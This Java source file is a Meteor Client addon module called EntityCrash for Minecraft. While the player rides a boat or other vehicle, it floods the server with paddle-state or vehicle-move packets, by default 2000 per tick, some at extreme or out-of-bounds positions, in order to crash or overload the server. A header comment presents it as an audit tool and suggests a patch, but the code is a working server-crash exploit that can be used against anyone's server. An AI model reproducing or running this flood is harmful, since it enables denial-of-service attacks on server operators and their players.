package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.AbstractBoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

/**
 * AUDIT: Entity Crash (vehicle move / paddle-state flood)
 *
 * Three modes while riding a vehicle:
 *
 *   Boat: floods BoatPaddleStateC2SPacket — the paddle animation is
 *   rebroadcast to nearby clients each tick. High rate = O(viewers) outbound
 *   spam plus a sound event per packet.
 *
 *   Movement: rapidly sets the vehicle to extreme Y values and sends
 *   VehicleMoveC2SPacket, testing whether vehicle position is bounds-checked
 *   with the same authority as player movement.
 *
 *   Position: floods VehicleMoveC2SPacket at a fixed OOB position — tests
 *   the rate limiter and position-validation path for vehicle packets
 *   specifically (a frequently-overlooked code path).
 *
 * Patch signal: apply the same coordinate-bounds and per-tick rate limits to
 * VehicleMoveC2SPacket as to PlayerMoveC2SPacket; rate-limit paddle events
 * to one per tick and debounce their broadcast to viewers.
 *
 * Ride an entity, enable. Run against your OWN local server only.
 */
public class EntityCrash extends Module {
    public enum Mode { Boat, Position, Movement }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.Position).build()
    );
    private final Setting<Double> speed = sgGeneral.add(new DoubleSetting.Builder()
        .name("speed").description("Blocks per packet (Movement mode).")
        .defaultValue(1337).sliderRange(50, 10000)
        .visible(() -> mode.get() == Mode.Movement).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(2000).sliderRange(100, 10000).build()
    );
    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound").description("Block paddle sounds.")
        .defaultValue(false).visible(() -> mode.get() == Mode.Boat).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public EntityCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "entity-crash",
            "Spams vehicle move/paddle packets while riding an entity. Tests vehicle position validation.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        Entity vehicle = mc.player.getVehicle();
        if (vehicle == null) {
            error("You must be riding an entity, toggling.");
            toggle();
            return;
        }

        int count = amount.get();
        switch (mode.get()) {
            case Boat -> {
                if (!(vehicle instanceof AbstractBoatEntity)) {
                    error("You must be in a boat, toggling.");
                    toggle();
                    return;
                }
                for (int i = 0; i < count; i++) {
                    mc.player.networkHandler.sendPacket(new BoatPaddleStateC2SPacket(true, true));
                    packetsSent++;
                }
            }
            case Movement -> {
                double step = speed.get();
                for (int i = 0; i < count; i++) {
                    Vec3d v = vehicle.getEntityPos();
                    vehicle.setPosition(v.x, v.y + step, v.z);
                    mc.player.networkHandler.sendPacket(VehicleMoveC2SPacket.fromVehicle(vehicle));
                    packetsSent++;
                }
            }
            case Position -> {
                BlockPos start = mc.player.getBlockPos();
                Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
                vehicle.updatePosition(end.x, end.y - 1, end.z);
                for (int i = 0; i < count; i++) {
                    mc.player.networkHandler.sendPacket(VehicleMoveC2SPacket.fromVehicle(vehicle));
                    packetsSent++;
                }
            }
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (!noSound.get()) return;
        String id = event.sound.getId().toString();
        if (id.contains("boat.paddle")) event.cancel();
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
